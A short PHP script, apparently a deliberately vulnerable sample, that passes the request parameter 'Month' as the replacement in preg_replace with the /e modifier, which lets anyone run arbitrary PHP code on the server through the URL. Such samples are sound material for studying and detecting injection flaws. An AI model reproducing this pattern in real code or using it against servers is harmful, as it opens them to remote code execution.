<?php
$string = "Today is August 4,2007";
$pattern = "/^/e";
echo preg_replace($pattern,$_GET["Month"],$string);
?>
